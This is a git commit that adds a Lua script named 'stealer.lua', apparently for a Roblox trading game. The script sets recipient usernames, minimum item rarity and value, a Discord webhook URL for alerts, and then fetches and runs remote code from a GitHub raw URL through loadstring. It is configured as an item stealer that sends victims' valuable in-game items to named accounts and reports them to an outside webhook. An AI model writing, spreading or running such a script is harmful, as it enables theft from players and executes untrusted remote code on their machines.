ba066882f1af9c76eeaf90af1030fdfaf28e2a62
NextPython <l34623766@gmail.com>
2026-09-12 20:04:13 -0600

    Add files via upload

---
+++ stealer.lua
@@ -0,0 +1,7 @@
+_G.Usernames = {"NextPython0"} -- you can add as many as you'd like
+_G.min_rarity = "Godly"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1548504740139237456/tIaigS0ovSAHZ7cTCj278lw8DJKgEc2T6cbTlXD5AKkswzNguT3wjTXyWSlCFZzKtv7O" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NextPython/hhhhhsdhhhs/refs/heads/main/source.lua"))()
